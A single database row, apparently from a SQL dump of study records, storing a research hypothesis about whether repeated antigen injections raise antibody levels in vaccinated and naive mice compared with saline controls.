	(5482,119,'hypothesis','\"Our hypothesis is that repeated administration of the antigen of interest will not lead to significantly elevated antibody concentrations in vaccinated mice, relative to the weekly administration of saline.\\n\\nIn naive mice, our hypothesis is that the repeated administration of the antigen of interest will initially cause the production of antibody, but that continued administration will not lead to steadily-increasing antibody concentrations, relative to mice that are given saline injections.\"','2022-03-31 13:23:42','2022-03-31 13:23:42'),
